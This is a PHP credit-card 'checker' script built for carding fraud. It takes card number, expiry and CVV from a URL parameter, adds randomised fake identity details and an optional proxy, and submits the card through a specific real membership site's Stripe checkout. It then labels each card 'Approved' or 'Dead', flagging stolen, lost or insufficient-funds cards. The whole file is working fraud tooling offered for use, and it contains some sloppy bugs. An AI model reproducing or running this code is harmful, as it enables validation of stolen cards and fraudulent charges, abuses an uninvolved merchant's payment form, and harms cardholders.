<?php






error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$proxySocks4 = $_GET['proxy'];
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
$six = $_GET['lista'];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}

function curl($url, $var = null) {
      $curl = curl_init($url);
      curl_setopt($curl, CURLOPT_TIMEOUT, 25);
      if ($var != null) {
          curl_setopt($curl, CURLOPT_POST, true);
          curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
      }
      curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
      curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
      $result = curl_exec($curl);
      curl_close($curl);
      return $result;
  }
  // Enam digit Formula
  function defineNUM($bin) {
      return substr($bin,0,6);
  }
  // JSON DATA
    $bin = defineNUM($six);
    $curl = curl("https://lookup.binlist.net/".$bin); // Thanks to this API!
    $json = json_decode($curl);
    $brand = $json->scheme ? $json->scheme : "error";
    $cardType = $json->type ? $json->type : "error";
    $cardCategory = $json->bank ? $json->bank : "error";
    $countryName = $json->country ? $json->country : "error";
    $countryCode = $json->country ? $json->country : "error";
    $details = ''.$cardCategory->name.'-'.$cardType.'-'.$countryName->alpha2.'';
    if ($six == null) {
    die('error!');
}
$binresult = $details;

if(file_exists(getcwd().('/cookie.txt'))){
  @unlink('cookie.txt');
}
/*
$crawleraproxy = 'proxy.crawlera.com:8010';
$proxyauth = 'fb04ba68d60945b793bac549f7ae41e9:';
*/
////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="colorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";}


/*switch ($ano) {
  case '2019':
  $ano = '19';
    break;
  case '2020':
  $ano = '20';
    break;
  case '2021':
  $ano = '21';
    break;
  case '2022':
  $ano = '22';
    break;
  case '2023':
  $ano = '23';
    break;
  case '2024':
  $ano = '24';
    break;
  case '2025':
  $ano = '25';
    break;
  case '2026':
  $ano = '26';
    break;
    case '2027':
    $ano = '27';
    break;
}*/

////////////////////////////===[For Authorizing Cards]

/////////========Luminati
////////=========Socks Proxy

/*
$proxies = array();
$proxies [] = '207.229.93.68:1025'; //Some proxies require IP,port no.
$proxies [] = '207.229.93.68:1026';
$proxies [] = '207.229.93.68:1027';
$proxies [] = '207.229.93.68:1028';
$proxies [] = '207.229.93.68:1029';
///if (isset($proxies)) {*/
    ///$proxy = $proxies[array_rand($proxies)];
///}


////////////////////////////===[For Authorizing Cards]

////////////////////////////===[1st Req]

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4); uncomment to use proxy.txt
curl_setopt($ch, CURLOPT_URL, 'https://sweatysoulstudio.com/wp-admin/admin-ajax.php');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: sweatysoulstudio.com',
'accept: application/json, text/javascript, */*; q=0.01', 
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded',
'origin: https://sweatysoulstudio.com/',
'referer: https://sweatysoulstudio.com/strength-workouts/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'x-requested-with:XMLHttpRequest'
));
//'user-agent: #'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=arm_membership_setup_form_ajax_action&form_random_key=10_f54JzukdXw&setup_id=10&setup_action=membership_setup&arm_user_old_plan=0&arm_is_user_logged_in_flag=0&arm_front_plan_skin_type=skin1&subscription_plan=9&arm_paid_post=5669132&arm_plan_type=paid_infinite&first_name=Mike&user_email='.$name.'owen%40gmail.com&user_login=Metry98&user_pass=Mike938%40&arm_action=create-your-account-8lv&redirect_to=https%3A%2F%2Fsweatysoulstudio.com&isAdmin=0&referral_url=http%3A%2F%2Fsweatysoulstudio.kodendigital.co.uk&arm_form_id=112&form_filter_kp=34&form_filter_st=1614932684&arm_nonce_check=fde5a8800b&arm_front_gateway_skin_type=radio&payment_gateway=stripe&arm_payment_mode%5Bstripe%5D=manual_subscription&stripe%5Bcard_holder_name%5D=James+Curry&stripe%5Bcard_number%5D='.$cc.'&stripe%5Bexp_month%5D='.$mes.'&stripe%5Bexp_year%5D='.$ano.'&stripe%5Bcvc%5D='.$cvv.'&arm_selected_payment_mode=manual_subscription&arm_total_payable_amount=39.00&arm_zero_amount_discount=0.00&hgmsjzhf=');

$result1 = curl_exec($ch);
$token = trim(strip_tags(getStr($result1,'"id": "','"')));

////Uncomment this section for using 2req////////////////////////===[For Charging Cards]-[If U Want To Charge Your Card Uncomment And Add Site]
/*
 $ch = curl_init();

//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4); Uncomment to use proxy.txt
 curl_setopt($ch, CURLOPT_URL, '#');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
 curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
   'accept: application/json, text/javascript,  ',   
   'Origin: #',
   'referer: #',
   'Sec-Fetch-Mode: cors',
//'X-Requested-With: XMLHttpRequest',
 ));
 curl_setopt($ch, CURLOPT_POSTFIELDS, '#');
*/
 $result = curl_exec($ch);


////////////////////////////===[Card Response]

if(strpos($result, '"cvc_check": "pass"')){

  echo "<font size=5 color='green'><font class='badge badge-success'>Approved <i class='zmdi zmdi-check'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='green'><font class='badge badge-success'>CVV MATCHED</i></font> </i></font><br> </i> </font><br>";

  }
  elseif(strpos($result, "BOLETO RECARGADO" )) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Approved <i class='zmdi zmdi-check'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='green'><font class='badge badge-success'>CVV MATCHED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "Thank You." )) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Approved <i class='zmdi zmdi-check'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='green'><font class='badge badge-success'>SUCCESS CHARGED</i></font> </i> </font><br>";
  }
  elseif(strpos($result,'"status": "succeeded"')){
      echo "<font size=5 color='green'><font class='badge badge-success'>Approved <i class='zmdi zmdi-check'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='green'><font class='badge badge-success'>SUCCESSFULLY CHARGED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, 'Your card zip code is incorrect.' )) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Approved <i class='zmdi zmdi-check'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='green'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "incorrect_zip" )) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Approved <i class='zmdi zmdi-check'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='green'><font class='badge badge-success'>CVV - INCORRECT ZIP</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "Success" )) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Approved <i class='zmdi zmdi-check'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='green'><font class='badge badge-success'>SUCCESSFULY CHARGED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "succeeded." )) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Approved <i class='zmdi zmdi-check'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='green'><font class='badge badge-success'>SUCCESSFULLY CHARGED</i></font> </i> </font><br>";
  }
  elseif(strpos($result,'"type":"one-time"')){
  echo "<font size=5 color='green'><font class='badge badge-success'>Approved <i class='zmdi zmdi-check'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='green'><font class='badge badge-success'>CVV MATCHED</i></font> </i> </font><br>";
  }
  elseif(strpos($result, 'Your card has insufficient funds.')) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Approved  <i class='zmdi zmdi-check'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='green'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "insufficient_funds")) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Approved <i class='zmdi zmdi-check'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='green'><font class='badge badge-success'>INSUFFICIENT FUNDS</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "lost_card" )) {
  echo "<font size=5 color='green'><font class='badge badge-warning'>Approved <i class='zmdi zmdi-check'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='green'><font class='badge badge-warning'>LOST CARD</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "stolen_card" )) {
  echo "<font size=5 color='green'><font class='badge badge-warning'>Approved <i class='zmdi zmdi-check'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='green'><font class='badge badge-warning'>STOLEN CARD</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "Your card's security code is incorrect.")) {
  echo "<font size=5 color='green'><font class='badge badge-light'>Approved <i class='zmdi zmdi-check'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='green'><font class='badge badge-light'>CVV INCORRECT</i></font>  <br>";
  }
  elseif(strpos($result, "incorrect_cvc" )) {
  echo "<font size=5 color='green'><font class='badge badge-success'>Approved  <i class='zmdi zmdi-check'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='green'><font class='badge badge-light'>CVV INCORRECT</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "pickup_card" )) {
  echo "<font size=5 color='green'><font class='badge badge-warning'>Approved <i class='zmdi zmdi-check'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='green'><font class='badge badge-warning'>STOLEN OR LOST</i></font> </i> </font><br>";
  }
  elseif(strpos($result, "Your card's expiration year is invalid.")) {
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-danger'>CARD EXPIRED</i> </font><br>";
  }
  elseif(strpos($result, "expired_card" )) {
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-danger'>CARD EXPIRED</i> </font><br>";
  }
  elseif(strpos($result, 'Your card number is incorrect.')) {
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i> </font><br>";
  }
  elseif(strpos($result, "incorrect_number")) {
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-danger'>INCORRECT CARD NUMBER</i> </font><br>";
  }
  elseif(strpos($result, "service_not_allowed")) {
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead  <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-danger'>SERVICE NOT ALLOWED</i> </font><br>";
  }
  elseif(strpos($result, "do_not_honor")) {
  echo "<font size=5 color='red'><font class='badge badge-warning'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-warning'>DO NOT HONOR</i> </font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font size=5 color='red'><font class='badge badge-warning'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-warning'>GENERIC DECLINED</i> </font><br>";
  }
  elseif(strpos($result, 'Your card was declined.')) {
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-danger'>CARD DECLINED</i> </font><br>";
  }
  elseif(strpos($result, "generic_decline")) {
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead  <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-danger'>GENERIC DECLINED</i> </font><br>";
  }
  elseif(strpos($result,'"cvc_check": "fail"')){
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-warning'>CVC_CHECKED : Fail</i> </font><br>";
  }
  elseif(strpos($result,"parameter_invalid_empty")){
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-danger'>MISSING CARD DETAIL</i> </font><br>";
  }
  elseif(strpos($result,"lock_timeout")){
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-warning'>CARD NOT CHECK</i> </font><br>";
  }
  elseif (strpos($result, 'Your card does not support this type of purchase.')) {
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-danger'>CARD NOT SUPPORTED</i> </font><br>";
  }
  elseif(strpos($result,"transaction_not_allowed")){
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-danger'>CARD NOT SUPPORTED</i> </font><br>";
  }
  elseif(strpos($result,"three_d_secure_redirect")){
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-danger'>CARD NOT SUPPORTED</i> </font><br>";
  }
  elseif(strpos($result, 'Card is declined by your bank, please contact them for additional primaryrmation.')) {
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-danger'>3D SECURED</i> </font><br>";
  }
  elseif(strpos($result,"missing_payment_primaryrmation")){
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-danger'>MISSING PAYMENT PRIMARYRMATION</i> </font><br>";
  }
  elseif(strpos($result, "Payment cannot be processed, missing credit card number")) {
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-danger'>MISSING CREDIT CARD NUMBER</i> </font><br>";
}
elseif(strpos($result, "card_not_supported")) {
  echo "<font size=5 color='red'><font class='badge badge-warning'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-warning'>CARD NOT SUPPORTED</i> </font><br>";
}
elseif(strpos($result, 'Your card is not supported.')) {
  echo "<font size=5 color='red'><font class='badge badge-warning'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-warning'>CARD NOT SUPPORTED</i> </font><br>";
}
elseif(strpos($result, 'fraudulent')) {
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-danger'>Fraudulent</i> </font><br>";
} 
else {
  echo "<font size=5 color='red'><font class='badge badge-danger'>Dead <i class='zmdi zmdi-close'></i></font><span class='badge'> $cc|$mes|$ano|$cvv </span><span class='badge badge-info'>$binresult</span> <font size=5 color='red'><font class='badge badge-danger'>Server Failure/Error Not Listed</i> </font><br>";
}


curl_close($ch);
//echo $result;
ob_flush();


?>